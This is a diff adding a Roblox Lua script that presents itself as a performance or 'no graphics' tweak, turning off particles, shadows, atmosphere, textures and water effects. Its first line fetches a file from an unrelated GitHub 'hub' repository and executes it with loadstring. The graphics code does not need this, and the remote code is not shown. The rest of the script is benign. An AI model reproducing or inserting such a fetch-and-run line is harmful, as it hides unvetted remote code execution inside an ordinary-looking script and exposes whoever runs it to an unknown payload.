@@ -1,0 +1,82 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TND-Hub/TND-Hub/refs/heads/main/output.lua%20(9).txt"))()
+
+local P=game:GetService("Players")
+local W=game:GetService("Workspace")
+local L=game:GetService("Lighting")
+local C=W.CurrentCamera
+local Pl=P.LocalPlayer
+local Ch=Pl.Character
+local E={"ParticleEmitter","Trail","Beam","Fire","Smoke","Sparkles","Explosion","Decal","Texture","PostEffect","Atmosphere","Sky","Clouds"}
+local function f(v)
+	if not v or not v.Parent then return end
+	if v:IsA("ParticleEmitter")or v:IsA("Trail")or v:IsA("Beam")or v:IsA("Fire")or v:IsA("Smoke")or v:IsA("Sparkles")then
+		v.Enabled=false
+		return
+	end
+	if v:IsA("Explosion")then
+		v.Visible=false
+		return
+	end
+	if v:IsA("PostEffect")then
+		v.Enabled=false
+		return
+	end
+	if v:IsA("Atmosphere")then
+		v.Density=0
+		v.Haze=0
+		v.Glare=0
+		return
+	end
+	if v:IsA("Clouds")then
+		v.Cover=0
+		v.Density=0
+		return
+	end
+	if v:IsA("Decal")or v:IsA("Texture")then
+		v.Transparency=1
+		return
+	end
+	if v:IsA("BasePart")and(not Ch or not v:IsDescendantOf(Ch))then
+		v.Material=Enum.Material.SmoothPlastic
+		v.CastShadow=false
+		v.Reflectance=0
+		if v:IsA("MeshPart")then
+			pcall(function()v.RenderFidelity=Enum.RenderFidelity.Performance end)
+		end
+		local n=v.Name:lower()
+		if n:find("effect")or n:find("mesh")or n:find("hit")or v.Transparency>.5 then
+			v.Transparency=1
+		end
+	end
+end
+L.GlobalShadows=false
+pcall(function()L.Technology=Enum.Technology.Compatibility end)
+pcall(function()L.EnvironmentDiffuseScale=0 end)
+pcall(function()L.EnvironmentSpecularScale=0 end)
+local T=W:FindFirstChildOfClass("Terrain")
+if T then
+	pcall(function()T.Decoration=false end)
+	pcall(function()T.WaterWaveSize=0;T.WaterWaveSpeed=0;T.WaterReflectance=0;T.WaterTransparency=1 end)
+end
+for _,v in ipairs(W:GetDescendants())do f(v)end
+for _,v in ipairs(L:GetDescendants())do f(v)end
+if C then for _,v in ipairs(C:GetDescendants())do f(v)end end
+W.DescendantAdded:Connect(function(v)task.defer(f,v)end)
+L.DescendantAdded:Connect(function(v)task.defer(f,v)end)
+if C then C.DescendantAdded:Connect(function(v)task.defer(f,v)end)end
+Pl.CharacterAdded:Connect(function(c)
+	Ch=c
+	for _,v in ipairs(c:GetDescendants())do f(v)end
+	c.DescendantAdded:Connect(function(v)task.defer(f,v)end)
+end)
+task.spawn(function()
+	while task.wait(3)do
+		for _,v in ipairs(L:GetDescendants())do f(v)end
+		if T then
+			pcall(function()T.Decoration=false end)
+			pcall(function()T.WaterWaveSize=0;T.WaterWaveSpeed=0;T.WaterReflectance=0 end)
+		end
+	end
+end)
+collectgarbage("collect")
+print("[NO-GFX] ON")
